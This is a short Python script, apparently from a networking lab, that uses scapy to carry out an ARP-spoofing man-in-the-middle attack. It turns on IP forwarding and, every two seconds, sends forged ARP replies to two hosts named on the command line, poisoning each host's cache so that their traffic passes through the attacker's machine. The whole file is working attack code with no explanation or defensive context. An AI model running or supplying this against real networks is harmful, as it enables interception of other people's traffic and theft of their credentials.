from scapy.all import *
import time 
import sys
import os

if len(sys.argv) !=3:
	print("Usage: sudo python3 mimt")
	sys.exit(1)

BOWSER, R1 = sys.argv[1:3]
MY_MAC = get_if_hwaddr(conf.iface)

os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
print(f"MINT: {BOWSER} -- {R1}")


try:
	while True:
		send(ARP(op=2, pdst=BOWSER, psrc=R1, hwsrc=MY_MAC), verbose=0)
		send(ARP(op=2, pdst=R1, psrc=BOWSER, hwsrc=MY_MAC), verbose=0)
		time.sleep(2)
except KeyboardInterrupt:
	print("\n stop")
